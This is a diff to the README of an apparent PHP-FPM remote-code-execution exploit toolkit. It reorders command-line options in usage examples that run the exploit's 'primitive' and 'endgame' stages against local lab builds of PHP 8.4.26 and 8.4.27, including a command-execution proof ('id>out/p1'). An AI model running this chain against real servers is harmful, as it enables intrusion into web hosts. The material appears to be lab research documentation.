@@ -144,11 +144,13 @@ i.e. real command execution inside the FPM worker.
 stale state:
 
 ```sh
-python3 tools/php2shell_fpm.py patchcheck --base http://127.0.0.1:8110
+python3 tools/php2shell_fpm.py patchcheck
 # 8.4.26: BG.data=0x7f07be281000 level=1 STALE-ARMED
-python3 tools/php2shell_fpm.py patchcheck --base http://127.0.0.1:8120
 # 8.4.27: level=0 clean (both workers survive the post-RINIT OOM probe)
 ```
+
+`patchcheck` iterates both laboratory builds (ports 8110/8120); it takes no
+target arguments.
 
 ## Laboratory
 
@@ -191,14 +193,18 @@ lab/fpm/runtime/php-8.4.27/sbin/php-fpm \
 Directly (recommended first runs):
 
 ```sh
-python3 tools/php2shell_fpm.py primitive \
-  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111
+python3 tools/php2shell_fpm.py \
+  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 \
+  primitive
 # forged benign var_entries; observable via app.php (r<TAB>value)
 
-python3 tools/php2shell_fpm.py endgame \
+python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 \
-  --version 8.4.26 --command 'id>out/p1' --proof-file out/p1
+  --version 8.4.26 --command 'id>out/p1' --proof-file out/p1 \
+  endgame
 ```
+
+(Global options come before the subcommand.)
 
 Via the dispatcher (`tools/php2shell_auto.py` fingerprints nginx and routes
 to the FPM chain; the lab needs an explicit `--builder` because the consumer
